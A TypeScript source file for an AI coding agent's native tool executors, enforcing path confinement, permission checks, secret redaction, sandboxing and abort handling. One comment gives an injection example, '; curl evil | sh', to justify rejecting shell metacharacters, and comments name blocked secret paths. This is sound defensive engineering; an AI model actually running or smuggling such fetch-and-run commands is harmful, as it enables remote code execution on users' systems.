import { spawn } from 'node:child_process';
import {
  closeSync,
  constants as fsConstants,
  existsSync,
  mkdirSync,
  openSync,
  readFileSync,
  readdirSync,
  realpathSync,
  statSync,
  writeSync,
} from 'node:fs';
import path from 'node:path';
import { minimatch } from 'minimatch';
import { redactSecrets } from '@excalibur/model-gateway';
import type { ExcaliburConfig } from '@excalibur/shared';
import { getNativeTool, type NativeToolName } from './native-tools';
import { hasShellMetacharacters, type PermissionEngine } from '../permissions/permission-engine';
import { runInDockerSandbox, type SandboxLimits } from '../sandbox/docker-sandbox';
import { webFetch, type FetchImpl } from './web/fetch';

/**
 * Real native-tool executors (OSS-7, M2) — the security-critical core of the
 * native agent. Every executor enforces defense in depth BEFORE touching the
 * host:
 *
 *  1. zod validation of the model-supplied `args` (malformed → declined).
 *  2. PATH CONFINEMENT for every path arg: the path is resolved against the
 *     workdir and rejected unless it stays inside it; absolute paths, `..`
 *     escapes and symlinks that point out of the tree are refused before any
 *     fs call. (`assertConfined`).
 *  3. PERMISSION GATE: `PermissionEngine.checkPath/checkCommand/checkTool` — a
 *     `deny` returns `{ ok: false }`; a `requiresConfirmation` is handled one
 *     level up (the adapter's confirm-or-decline gate) so this module never
 *     prompts.
 *  4. REDACTION: every result string (file contents, command output, diffs)
 *     is passed through `redactSecrets` before it leaves this module, so a
 *     secret read off disk or printed by a command is masked before it can
 *     re-enter the prompt or an emitted event.
 *
 * Executors NEVER throw on a denied/invalid request: the textual result is fed
 * back to the model so it can adapt. They only let truly unexpected internal
 * errors surface as `{ ok: false }` with a redacted message.
 */

/** Execution context threaded into every tool executor. */
export interface ToolExecutionContext {
  /** Absolute working directory the agent is confined to. */
  workdir: string;
  config: ExcaliburConfig;
  permissions: PermissionEngine;
  /** Environment for spawned commands (defaults to a minimal inherited env). */
  env?: NodeJS.ProcessEnv;
  /**
   * Optional abort signal. When it fires, any in-flight spawned process
   * (run_command / run_tests / git) is SIGKILLed immediately instead of
   * running to completion or the 120s timeout — so ESC/abort actually stops
   * work the agent already started.
   */
  signal?: AbortSignal;
  /** Injectable fetch for `web_fetch` (tests pass a fake; defaults to global fetch). */
  httpFetch?: FetchImpl;
}

export interface ToolResult {
  ok: boolean;
  result: string;
}

/** Max bytes returned from read_file before truncation. */
const MAX_READ_BYTES = 256 * 1024;
/** Max entries returned from list_files. */
const MAX_LIST_ENTRIES = 1000;
/** Max matches returned from search_code. */
const DEFAULT_SEARCH_MAX = 200;
/** Max bytes of a single file scanned by search_code. */
const SEARCH_FILE_MAX_BYTES = 1024 * 1024;
/** Command timeout (ms) for run_command / run_tests / git operations. */
const COMMAND_TIMEOUT_MS = 120_000;
/** Max bytes captured from a command's combined stdout+stderr. */
const COMMAND_OUTPUT_MAX = 256 * 1024;
/** Directories never walked by search_code / list_files. */
const SKIP_DIRS = new Set(['.git', 'node_modules', 'dist', 'build', 'coverage']);
/** Max recursion depth for directory walks (anti stack-exhaustion). */
const MAX_WALK_DEPTH = 100;
/** Max length of a user/model regex source (cheap ReDoS bound, no new deps). */
const MAX_REGEX_SOURCE = 200;
/** Lines longer than this are skipped by search_code (anti catastrophic backtracking). */
const MAX_SEARCH_LINE_LENGTH = 2000;

function ok(result: string): ToolResult {
  return { ok: true, result: redactSecrets(result) };
}

function fail(result: string): ToolResult {
  return { ok: false, result: redactSecrets(result) };
}

/**
 * Resolves `relPath` against `workdir` and asserts it stays inside it. Rejects
 * absolute inputs and `..` escapes. When the resolved target (or an ancestor)
 * is a symlink, the realpath is re-checked so a symlink can never tunnel out of
 * the tree. Returns the absolute path on success, or an error string.
 */
/** Target file paths a unified diff writes (`+++ b/x`, `--- a/x`, renames). */
function diffTargetPaths(diff: string): string[] {
  const paths = new Set<string>();
  const add = (raw: string): void => {
    const p = raw.trim().replace(/^[ab]\//, '');
    if (p.length > 0 && p !== '/dev/null') paths.add(p);
  };
  for (const line of diff.split('\n')) {
    const header = /^(?:\+\+\+|---) (.+)$/.exec(line);
    if (header) add(header[1] as string);
    const git = /^diff --git a\/(.+?) b\/(.+)$/.exec(line);
    if (git) {
      add(git[1] as string);
      add(git[2] as string);
    }
    const rename = /^rename (?:from|to) (.+)$/.exec(line);
    if (rename) add(rename[1] as string);
  }
  return [...paths];
}

function assertConfined(workdir: string, relPath: string): { abs: string } | { error: string } {
  if (typeof relPath !== 'string' || relPath.length === 0) {
    return { error: 'empty path' };
  }
  if (path.isAbsolute(relPath)) {
    return { error: `absolute paths are not allowed: "${relPath}"` };
  }
  const root = path.resolve(workdir);
  const abs = path.resolve(root, relPath);
  if (!(abs === root || abs.startsWith(root + path.sep))) {
    return { error: `path escapes the working directory: "${relPath}"` };
  }
  // Symlink safety: if the path (or its nearest existing ancestor) resolves via
  // a symlink to somewhere outside the tree, refuse. New files (parent exists,
  // leaf does not) are fine — we realpath the deepest existing ancestor.
  let probe = abs;
  while (probe !== root && !existsSync(probe)) {
    probe = path.dirname(probe);
  }
  if (existsSync(probe)) {
    let real: string;
    try {
      real = realpathSync(probe);
    } catch {
      return { error: `cannot resolve path: "${relPath}"` };
    }
    const realRoot = (() => {
      try {
        return realpathSync(root);
      } catch {
        return root;
      }
    })();
    if (!(real === realRoot || real.startsWith(realRoot + path.sep))) {
      return { error: `path resolves outside the working directory via a symlink: "${relPath}"` };
    }
  }
  return { abs };
}

/** Validates raw args against the tool's zod schema; returns parsed args or an error. */
function validate(
  name: NativeToolName,
  args: unknown,
): { data: Record<string, unknown> } | { error: string } {
  const def = getNativeTool(name);
  if (def === undefined) {
    return { error: `unknown tool "${name}"` };
  }
  const parsed = def.parameters.safeParse(args);
  if (!parsed.success) {
    const issues = parsed.error.issues
      .map((issue) => `${issue.path.join('.') || '(root)'}: ${issue.message}`)
      .join('; ');
    return { error: `invalid arguments: ${issues}` };
  }
  return { data: parsed.data as Record<string, unknown> };
}

/**
 * Runs a child process (command via shell, or git via argv) confined to `cwd`,
 * with a hard timeout and bounded output capture. Resolves with the exit code
 * and combined (capped) output; never rejects.
 */
function runProcess(
  file: string,
  args: string[],
  options: {
    cwd: string;
    env?: NodeJS.ProcessEnv;
    shell?: boolean;
    input?: string;
    signal?: AbortSignal;
  },
): Promise<{ code: number | null; output: string; timedOut: boolean; aborted: boolean }> {
  return new Promise((resolve) => {
    const { signal } = options;
    if (signal?.aborted === true) {
      resolve({
        code: null,
        output: '(command aborted before start)',
        timedOut: false,
        aborted: true,
      });
      return;
    }
    const onUnix = process.platform !== 'win32';
    const child = spawn(file, args, {
      cwd: options.cwd,
      env: options.env ?? { PATH: process.env['PATH'] ?? '', HOME: process.env['HOME'] ?? '' },
      shell: options.shell ?? false,
      stdio: ['pipe', 'pipe', 'pipe'],
      // Run in its own process group (group leader pid == child.pid) so an abort
      // can SIGKILL the WHOLE command tree, not just the shell. With `shell:true`
      // the child is `/bin/sh -c "<cmd>"`; killing only the shell leaves the real
      // command (e.g. `sleep`) orphaned, still holding the stdio pipes open, so
      // Node's 'close' never fires and the run hangs to the 120s timeout.
      detached: onUnix,
    });

    let output = '';
    let bytes = 0;
    let timedOut = false;
    let aborted = false;
    let settled = false;
    let spawned = false;
    let killPending = false;

    // SIGKILL the whole process group. `child.kill()` is also a no-op until the
    // OS has actually spawned the process (no pid yet), so an abort that lands in
    // that spawn window would be dropped — gate on the 'spawn' event and replay a
    // pending kill once the process is really running, so abort is always honoured.
    const killTree = (): void => {
      if (!spawned) {
        killPending = true;
        return;
      }
      const pid = child.pid;
      if (onUnix && pid !== undefined) {
        try {
          // Negative pid → the whole group (the shell + every child it spawned).
          // Safe only because we spawned `detached` (own group); without that a
          // negative pid would target the test runner's own group.
          process.kill(-pid, 'SIGKILL');
          return;
        } catch {
          // Group already gone — fall through to a direct kill.
        }
      }
      child.kill('SIGKILL');
    };
    child.once('spawn', () => {
      spawned = true;
      if (killPending) {
        killTree();
      }
    });

    const capture = (chunk: Buffer): void => {
      if (bytes >= COMMAND_OUTPUT_MAX) {
        return;
      }
      const remaining = COMMAND_OUTPUT_MAX - bytes;
      const text = chunk.toString('utf8');
      output += text.length > remaining ? `${text.slice(0, remaining)}\n…(output truncated)` : text;
      bytes += Buffer.byteLength(text);
    };
    child.stdout?.on('data', capture);
    child.stderr?.on('data', capture);

    const timer = setTimeout(() => {
      timedOut = true;
      killTree();
    }, COMMAND_TIMEOUT_MS);

    // Kill the spawned process the moment the run is aborted (ESC / signal),
    // rather than letting it run to completion or the 120s timeout.
    const onAbort = (): void => {
      aborted = true;
      killTree();
    };
    signal?.addEventListener('abort', onAbort, { once: true });

    const finish = (code: number | null): void => {
      if (settled) {
        return;
      }
      settled = true;
      clearTimeout(timer);
      signal?.removeEventListener('abort', onAbort);
      if (aborted) {
        output += '\n…(command aborted)';
      }
      resolve({ code, output, timedOut, aborted });
    };

    child.on('error', (error) => {
      output += `\n${error.message}`;
      finish(null);
    });
    child.on('close', (code) => finish(code));

    if (options.input !== undefined) {
      child.stdin?.write(options.input);
    }
    child.stdin?.end();
  });
}

// --- individual tool executors ----------------------------------------------

function execReadFile(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const relPath = args['path'] as string;
  const confined = assertConfined(ctx.workdir, relPath);
  if ('error' in confined) {
    return fail(`rejected: ${confined.error}`);
  }
  const decision = ctx.permissions.checkPath(relPath, 'read');
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  if (!existsSync(confined.abs)) {
    return fail(`file not found: "${relPath}"`);
  }
  const stat = statSync(confined.abs);
  if (stat.isDirectory()) {
    return fail(`"${relPath}" is a directory, not a file`);
  }
  let content = readFileSync(confined.abs, 'utf8');
  let truncated = false;
  if (Buffer.byteLength(content) > MAX_READ_BYTES) {
    content = content.slice(0, MAX_READ_BYTES);
    truncated = true;
  }
  return ok(truncated ? `${content}\n…(truncated at ${MAX_READ_BYTES} bytes)` : content);
}

function execWriteFile(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const relPath = args['path'] as string;
  const fileContent = args['content'] as string;
  const confined = assertConfined(ctx.workdir, relPath);
  if ('error' in confined) {
    return fail(`rejected: ${confined.error}`);
  }
  const decision = ctx.permissions.checkPath(relPath, 'write');
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  const dir = path.dirname(confined.abs);
  // mkdir -p, but only within the confined tree (dir is already confined).
  mkdirSync(dir, { recursive: true });
  // TOCTOU-safe write: open with O_NOFOLLOW so the kernel refuses (ELOOP) if the
  // FINAL path component is a symlink AT OPEN TIME — closing the race window
  // between a check-then-write where the leaf could be swapped for a symlink
  // pointing outside the tree. assertConfined (above) already realpath-checks
  // the intermediate dirs, so only the leaf needs this atomic guard.
  let fd: number;
  try {
    fd = openSync(
      confined.abs,
      fsConstants.O_WRONLY | fsConstants.O_CREAT | fsConstants.O_TRUNC | fsConstants.O_NOFOLLOW,
      0o644,
    );
  } catch (error) {
    const code = (error as { code?: string }).code;
    if (code === 'ELOOP') {
      return fail(`permission denied: refusing to write through a symlink: "${relPath}"`);
    }
    if (code === 'EISDIR') {
      return fail(`"${relPath}" is a directory, not a file`);
    }
    if (code === 'EACCES' || code === 'EPERM') {
      return fail(`permission denied: cannot write "${relPath}"`);
    }
    return fail(`could not write "${relPath}"`);
  }
  try {
    writeSync(fd, fileContent, null, 'utf8');
  } finally {
    closeSync(fd);
  }
  return ok(`wrote ${Buffer.byteLength(fileContent)} bytes to "${relPath}"`);
}

function execListFiles(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const relDir = (args['path'] as string | undefined) ?? '.';
  const glob = args['glob'] as string | undefined;
  const confined = assertConfined(ctx.workdir, relDir);
  if ('error' in confined) {
    return fail(`rejected: ${confined.error}`);
  }
  const decision = ctx.permissions.checkPath(relDir === '.' ? '.' : relDir, 'read');
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  if (!existsSync(confined.abs)) {
    return fail(`directory not found: "${relDir}"`);
  }
  const root = path.resolve(ctx.workdir);
  const entries: string[] = [];
  const walk = (absDir: string, depth: number): void => {
    if (entries.length >= MAX_LIST_ENTRIES || depth > MAX_WALK_DEPTH) {
      return;
    }
    let dirents;
    try {
      dirents = readdirSync(absDir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const dirent of dirents) {
      if (entries.length >= MAX_LIST_ENTRIES) {
        return;
      }
      if (dirent.isSymbolicLink()) {
        continue;
      }
      const absChild = path.join(absDir, dirent.name);
      const rel = path.relative(root, absChild).split(path.sep).join('/');
      if (dirent.isDirectory()) {
        if (SKIP_DIRS.has(dirent.name)) {
          continue;
        }
        walk(absChild, depth + 1);
      } else if (dirent.isFile()) {
        if (glob === undefined || minimatch(rel, glob, { dot: true })) {
          entries.push(rel);
        }
      }
    }
  };
  walk(confined.abs, 0);
  entries.sort();
  const header = entries.length >= MAX_LIST_ENTRIES ? `(capped at ${MAX_LIST_ENTRIES})\n` : '';
  return ok(header + (entries.length > 0 ? entries.join('\n') : '(no files)'));
}

function execSearchCode(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const query = args['query'] as string;
  const glob = args['glob'] as string | undefined;
  const maxResults = (args['maxResults'] as number | undefined) ?? DEFAULT_SEARCH_MAX;

  let matcher: (line: string) => boolean;
  const regexMatch = /^\/(.+)\/([a-z]*)$/.exec(query);
  if (regexMatch !== null) {
    const source = regexMatch[1] ?? '';
    // Cheap ReDoS bound: a pathologically long pattern is the classic vector for
    // catastrophic backtracking — reject it before compiling, with no new deps.
    if (source.length > MAX_REGEX_SOURCE) {
      return fail(`invalid arguments: regex too long (max ${MAX_REGEX_SOURCE} chars)`);
    }
    try {
      const regex = new RegExp(source, regexMatch[2] ?? '');
      matcher = (line) => regex.test(line);
    } catch {
      return fail(`invalid regex: "${query}"`);
    }
  } else {
    matcher = (line) => line.includes(query);
  }

  const root = path.resolve(ctx.workdir);
  const matches: string[] = [];
  const walk = (absDir: string, depth: number): void => {
    if (matches.length >= maxResults || depth > MAX_WALK_DEPTH) {
      return;
    }
    let dirents;
    try {
      dirents = readdirSync(absDir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const dirent of dirents) {
      if (matches.length >= maxResults) {
        return;
      }
      if (dirent.isSymbolicLink()) {
        continue;
      }
      const absChild = path.join(absDir, dirent.name);
      const rel = path.relative(root, absChild).split(path.sep).join('/');
      if (dirent.isDirectory()) {
        if (SKIP_DIRS.has(dirent.name)) {
          continue;
        }
        walk(absChild, depth + 1);
        continue;
      }
      if (!dirent.isFile()) {
        continue;
      }
      if (glob !== undefined && !minimatch(rel, glob, { dot: true })) {
        continue;
      }
      // Never read blocked/secret paths into a search result.
      if (!ctx.permissions.checkPath(rel, 'read').allowed) {
        continue;
      }
      let content: string;
      try {
        const stat = statSync(absChild);
        if (stat.size > SEARCH_FILE_MAX_BYTES) {
          continue;
        }
        content = readFileSync(absChild, 'utf8');
      } catch {
        continue;
      }
      // Skip files that look binary.
      if (content.includes('\u0000')) {
        continue;
      }
      const lines = content.split('\n');
      for (let i = 0; i < lines.length; i += 1) {
        if (matches.length >= maxResults) {
          break;
        }
        const line = lines[i] ?? '';
        // Never run the (possibly user/model-supplied) regex on a pathologically
        // long line — that is the catastrophic-backtracking trigger.
        if (line.length > MAX_SEARCH_LINE_LENGTH) {
          continue;
        }
        if (matcher(line)) {
          const snippet = line.trim().slice(0, 200);
          matches.push(`${rel}:${i + 1}: ${snippet}`);
        }
      }
    }
  };
  walk(root, 0);

  if (matches.length === 0) {
    return ok('(no matches)');
  }
  const header = matches.length >= maxResults ? `(capped at ${maxResults})\n` : '';
  return ok(header + matches.join('\n'));
}

async function execRunCommand(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const command = args['command'] as string;
  const relCwd = args['cwd'] as string | undefined;
  const decision = ctx.permissions.checkCommand(command);
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  let cwd = path.resolve(ctx.workdir);
  if (relCwd !== undefined) {
    const confined = assertConfined(ctx.workdir, relCwd);
    if ('error' in confined) {
      return fail(`rejected: ${confined.error}`);
    }
    cwd = confined.abs;
  }
  // Sandbox (M3): when configured, the command runs inside an ephemeral Docker
  // container (only the repo mounted, no host secrets/network) — a second line of
  // defense beyond the allowlist/confirm gate.
  const sandbox = ctx.config.sandbox;
  if (sandbox?.enabled === true) {
    const limits: SandboxLimits = {
      ...(sandbox.image !== undefined ? { image: sandbox.image } : {}),
      ...(sandbox.memoryMb !== undefined ? { memoryMb: sandbox.memoryMb } : {}),
      ...(sandbox.cpus !== undefined ? { cpus: sandbox.cpus } : {}),
      ...(sandbox.network !== undefined ? { allowNetwork: sandbox.network } : {}),
    };
    const sb = runInDockerSandbox(cwd, command, limits);
    return formatCommandResult(
      command,
      sb.exitCode,
      `${sb.stdout}${sb.stderr}`.trim(),
      sb.timedOut,
    );
  }
  // Host execution: the command is gated by the allowlist/confirm path before
  // reaching here, so it runs through the shell as-is. We pin a minimal env
  // (PATH+HOME only) so a command cannot read arbitrary secrets out of the env.
  const { code, output, timedOut } = await runProcess(command, [], {
    cwd,
    ...(ctx.env !== undefined ? { env: ctx.env } : {}),
    shell: true,
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
  });
  return formatCommandResult(command, code, output, timedOut);
}

async function execRunTests(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const override = args['command'] as string | undefined;
  const pattern = args['pattern'] as string | undefined;
  // SECURITY: `pattern` is concatenated into a shell command, so a `pattern`
  // like `; curl evil | sh` would inject. A test filter never needs shell
  // metacharacters — refuse them outright (the gate elsewhere checks `command`).
  if (pattern !== undefined && hasShellMetacharacters(pattern)) {
    return fail('test pattern must not contain shell metacharacters');
  }
  const base = override ?? ctx.config.commands?.test ?? 'npm test';
  const command = pattern !== undefined ? `${base} ${pattern}` : base;
  // Gate the EXACT composed command (not just `base`) — defeats checked≠executed.
  const decision = ctx.permissions.checkCommand(command);
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  // Honour the sandbox for test execution too (was host-only — a gap vs run_command).
  const sandbox = ctx.config.sandbox;
  if (sandbox?.enabled === true) {
    const limits: SandboxLimits = {
      ...(sandbox.image !== undefined ? { image: sandbox.image } : {}),
      ...(sandbox.memoryMb !== undefined ? { memoryMb: sandbox.memoryMb } : {}),
      ...(sandbox.cpus !== undefined ? { cpus: sandbox.cpus } : {}),
      ...(sandbox.network !== undefined ? { allowNetwork: sandbox.network } : {}),
    };
    const sb = runInDockerSandbox(path.resolve(ctx.workdir), command, limits);
    return formatCommandResult(
      command,
      sb.exitCode,
      `${sb.stdout}${sb.stderr}`.trim(),
      sb.timedOut,
    );
  }
  const { code, output, timedOut } = await runProcess(command, [], {
    cwd: path.resolve(ctx.workdir),
    ...(ctx.env !== undefined ? { env: ctx.env } : {}),
    shell: true,
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
  });
  return formatCommandResult(command, code, output, timedOut);
}

function formatCommandResult(
  command: string,
  code: number | null,
  output: string,
  timedOut: boolean,
): ToolResult {
  if (timedOut) {
    return fail(`command "${command}" timed out after ${COMMAND_TIMEOUT_MS}ms\n${output}`);
  }
  const exit = code ?? -1;
  const body = `$ ${command}\nexit code: ${exit}\n${output}`.trimEnd();
  return code === 0 ? ok(body) : fail(body);
}

async function execGitDiff(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const staged = args['staged'] === true;
  const paths = (args['paths'] as string[] | undefined) ?? [];
  const gitArgs = ['diff'];
  if (staged) {
    gitArgs.push('--cached');
  }
  if (paths.length > 0) {
    for (const relPath of paths) {
      const confined = assertConfined(ctx.workdir, relPath);
      if ('error' in confined) {
        return fail(`rejected: ${confined.error}`);
      }
      // SECURITY: refuse to diff a blocked path (e.g. `git diff -- .env`) — read
      // is gated like read_file, not left to output redaction alone.
      const decision = ctx.permissions.checkPath(relPath, 'read');
      if (!decision.allowed) {
        return fail(`rejected: reading "${relPath}" is blocked (${decision.reason})`);
      }
    }
    gitArgs.push('--', ...paths);
  }
  const { code, output, timedOut } = await runProcess('git', gitArgs, {
    cwd: path.resolve(ctx.workdir),
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
  });
  if (timedOut) {
    return fail('git diff timed out');
  }
  if (code !== 0) {
    return fail(`git diff failed (exit ${code ?? -1}):\n${output}`);
  }
  return ok(output.length > 0 ? output : '(no changes)');
}

async function execApplyPatch(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const diff = args['diff'] as string;
  // SECURITY: `git apply` only refuses OUT-OF-TREE writes; an IN-TREE diff could
  // still create/overwrite a blocked path (.env, *.key, .ssh/**) that write_file
  // denies — a clean bypass. Gate every target path through checkPath('write')
  // (and confine it) BEFORE applying, so apply_patch honours the same policy.
  for (const target of diffTargetPaths(diff)) {
    const confined = assertConfined(ctx.workdir, target);
    if ('error' in confined) {
      return fail(`patch rejected: ${confined.error}`);
    }
    const decision = ctx.permissions.checkPath(target, 'write');
    if (!decision.allowed) {
      return fail(`patch rejected: writing "${target}" is blocked (${decision.reason})`);
    }
  }
  // `git apply` (no --unsafe-paths) refuses out-of-tree / absolute paths itself.
  const { code, output, timedOut } = await runProcess(
    'git',
    ['apply', '--whitespace=nowarn', '-'],
    {
      cwd: path.resolve(ctx.workdir),
      input: diff.endsWith('\n') ? diff : `${diff}\n`,
      ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
    },
  );
  if (timedOut) {
    return fail('git apply timed out');
  }
  if (code !== 0) {
    return fail(`patch did not apply (exit ${code ?? -1}):\n${output}`);
  }
  return ok('patch applied');
}

async function execCreateBranch(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const name = args['name'] as string;
  const { code, output, timedOut } = await runProcess('git', ['checkout', '-b', name], {
    cwd: path.resolve(ctx.workdir),
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
  });
  if (timedOut) {
    return fail('git checkout timed out');
  }
  if (code !== 0) {
    return fail(`could not create branch "${name}" (exit ${code ?? -1}):\n${output}`);
  }
  return ok(`created and switched to branch "${name}"`);
}

/**
 * `update_tasks` is a no-op on disk: it only declares the agent's checklist. The
 * native adapter turns the (validated) snapshot into a `task_update` event for
 * the UI; here we just acknowledge it so the model continues.
 */
function execUpdateTasks(args: Record<string, unknown>): ToolResult {
  const tasks = Array.isArray(args['tasks']) ? (args['tasks'] as unknown[]) : [];
  const done = tasks.filter(
    (t) => typeof t === 'object' && t !== null && (t as { status?: string }).status === 'completed',
  ).length;
  return ok(`checklist updated (${done}/${tasks.length} done)`);
}

/**
 * Executes a native tool with full defense in depth (validation → path
 * confinement → permission gate → redaction). NEVER throws: a denied/invalid
 * request returns `{ ok: false, result }` so the result can be fed back to the
 * model. `requiresConfirmation` is NOT handled here — the adapter resolves the
 * confirm-or-decline gate before calling this function.
 */
/** `web_fetch` — governed by the network policy; SSRF + caps live in webFetch(). */
async function execWebFetch(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const url = String(args['url'] ?? '');
  const maxChars = typeof args['maxChars'] === 'number' ? args['maxChars'] : undefined;
  const decision = ctx.permissions.checkUrl(url);
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  try {
    const res = await webFetch(url, {
      ...(ctx.httpFetch !== undefined ? { fetchImpl: ctx.httpFetch } : {}),
      ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
      ...(maxChars !== undefined ? { maxChars } : {}),
    });
    const header =
      res.title.length > 0 && res.title !== res.url
        ? `# ${res.title}\n${res.url}\n\n`
        : `${res.url}\n\n`;
    return ok(`${header}${res.markdown}`);
  } catch (error) {
    return fail(`web_fetch failed: ${error instanceof Error ? error.message : String(error)}`);
  }
}

export async function executeNativeTool(
  name: NativeToolName,
  rawArgs: unknown,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const validated = validate(name, rawArgs);
  if ('error' in validated) {
    return fail(validated.error);
  }
  const args = validated.data;

  try {
    switch (name) {
      case 'read_file':
        return execReadFile(args, ctx);
      case 'write_file':
        return execWriteFile(args, ctx);
      case 'list_files':
        return execListFiles(args, ctx);
      case 'search_code':
        return execSearchCode(args, ctx);
      case 'run_command':
        return await execRunCommand(args, ctx);
      case 'run_tests':
        return await execRunTests(args, ctx);
      case 'git_diff':
        return await execGitDiff(args, ctx);
      case 'apply_patch':
        return await execApplyPatch(args, ctx);
      case 'create_branch':
        return await execCreateBranch(args, ctx);
      case 'update_tasks':
        return execUpdateTasks(args);
      case 'web_fetch':
        return await execWebFetch(args, ctx);
      default: {
        // Exhaustiveness guard: every NativeToolName is handled above.
        const exhaustive: never = name;
        return fail(`unhandled tool "${String(exhaustive)}"`);
      }
    }
  } catch (error) {
    // Never surface the raw message/stack: an fs error message can leak absolute
    // host paths. Map a known errno code to a generic phrase; redactSecrets is a
    // second layer (it does not strip ordinary paths).
    return fail(`tool "${name}" failed: ${genericErrorMessage(error)}`);
  }
}

/**
 * Builds a generic, host-path-free message from a thrown error's errno `code`,
 * never echoing the raw `error.message` (which can contain absolute paths).
 */
function genericErrorMessage(error: unknown): string {
  const code = (error as { code?: unknown }).code;
  if (typeof code === 'string') {
    switch (code) {
      case 'EACCES':
      case 'EPERM':
        return 'access denied';
      case 'ENOENT':
        return 'not found';
      case 'EISDIR':
        return 'is a directory';
      case 'ENOTDIR':
        return 'not a directory';
      case 'ELOOP':
        return 'symlink not permitted';
      case 'EMFILE':
      case 'ENFILE':
        return 'too many open files';
      default:
        return `tool failed (${code})`;
    }
  }
  return 'tool failed';
}
